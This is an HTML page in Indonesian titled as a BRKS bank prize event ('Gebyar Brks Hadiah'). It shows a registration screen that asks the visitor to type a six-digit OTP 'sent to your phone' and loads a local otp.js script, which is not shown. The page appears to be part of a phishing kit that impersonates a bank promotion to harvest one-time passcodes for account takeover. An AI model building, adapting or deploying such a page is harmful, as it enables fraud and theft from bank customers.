<html>
  <head>
    <title>Gebyar Brks Hadiah</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/data.css">
    <link rel="stylesheet" href="assets/lib/loader/loader.css">
    <link rel="stylesheet" href="assets/lib/ripple/ripple.css">
    <script src="assets/lib/jquery/jquery.js"></script>
    <script>
      const module = {};
    </script>
    <script type="module" src="assets/common/js/global.js"></script>
    <script type="module" src="assets/common/js/otp.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; background-color: #ffffff; overflow: scroll; display: flex; flex-direction: column; align-items: center;">
      <div style="width: 100%; box-shadow: 0 0 10px 5px rgba(0,0,0,0.2); display: flex; flex-direction: row; align-items: center; justify-content: space-between; align-items: center; background-color: #aa4237;">
        <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;">
          <ion-icon name="arrow-back-outline" style="color: #ffffff; font-size: 20px;"></ion-icon>
        </div>
        <div style="color: #ffffff; font-size: 17px;"><b>Registrasi</b></div>
        <div style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;">
          <ion-icon name="home" style="color: #ffffff; font-size: 20px;"></ion-icon>
        </div>
      </div>
      <div style="width: 100%; flex: 1; display: flex; flex-direction: column; align-items: center;">
        <div style="color: #444444; font-size: 20px; margin-top: 40px;"><b>KODE OTP</b></div>
        <div style="color: #222222; font-size: 14px; margin-top: 5px; margin-bottom: 50px; margin-left: 20px; margin-right: 20px; text-align: center;">Silahkan masukkan kode OTP yang telah kami kirimkan ke ponsel Anda</div>
        <div id="text1" style="display: none; color: #ff0000; font-size: 14px; margin-left: 20px; margin-right: 20px; text-align: center;">Kode OTP yang Anda masukkan salah</div>
        <div style="width: calc(100% - 140px); background-color: #dc714d; border-radius: 10px; box-shadow: 0 10px 10px 5px rgba(0,0,0,.2); display: flex; flex-direction: column; margin-top: 50px; margin-bottom: 20px; margin-left: 50px; margin-right: 50px; padding-top: 20px; padding-bottom: 20px; padding-left: 20px; padding-right: 20px;">
          <div style="width: 100%; display: flex; flex-direction: column; align-items: center;">
            <div style="color: #ffffff; font-size: 14px; margin-top: 10px;">Masukkan 6-digit kode OTP</div>
            <div style="display: flex; flex-direction: row; margin-top: 10px;">
            	<div style="flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp1" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
                <div style="margin-left: 5px; flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp2" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
                <div style="margin-left: 5px; flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp3" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
                <div style="margin-left: 5px; flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp4" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
                <div style="margin-left: 5px; flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp5" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
                <div style="margin-left: 5px; flex: 1; display: flex; flex-direction: column;">
            	  <input id="otp6" type="tel" maxlength="1" style="width: 30px; height: 30px; background-color: transparent; color: #ffffff; font-size: 17px; text-align: center; border: 0; outline: 0;">
            	  <div style="width: 100%; height: 2px; font-weight: bold; background-color: #ffffff;"></div>
                </div>
            </div>
            <div class="ripple2" style="width: 100%; height: 50px; background-color: #ffffff; margin-top: 20px; font-size: 15px; color: #dc714d; border-radius: 10px; display: flex; justify-content: center; align-items: center;">
            	LANJUTKAN
            </div>
          </div>
      </div>
      <div id="loader" style="display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; justify-content: center; align-items: center;">
        <div style="width: calc(100% - 80px); margin-left: 40px; margin-right: 40px; height: 120px; background-color: #ffffff; border-radius: 5px; display: flex; justify-content: center; align-items: center;">
          <div class="loader" style="width: 50px; height: 50px;"></div>
        </div>
      </div>
    </div>
  </body>
</html>
